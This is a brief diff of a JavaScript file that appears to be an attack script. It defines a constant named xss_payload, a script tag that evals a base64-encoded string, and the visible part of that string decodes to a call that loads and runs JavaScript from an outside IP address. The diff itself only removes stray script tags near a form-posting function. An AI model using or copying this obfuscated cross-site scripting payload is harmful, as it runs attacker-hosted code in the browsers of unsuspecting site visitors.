@@ -2,8 +2,6 @@ const xss_payload = "<script>eval(atob(\"JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xOC4yMjMuOTQ
 
 const links = require('./links.json');
 
-
-<script>
 const unis = ["Rochester Institute of Technology", "University of Rochester",
     "University at Buffalo", "Buffalo State College", "SUNY Brockport",
     "University at Waterloo", "SUNY Geneseo", "University of Toronto"
@@ -46,7 +44,6 @@ function post_About() {
     }
     xhr.send(`school=${university}&phone=${pnumber}`);
 }
-</script>
 
 
 // xhr.send(new Int8Array());
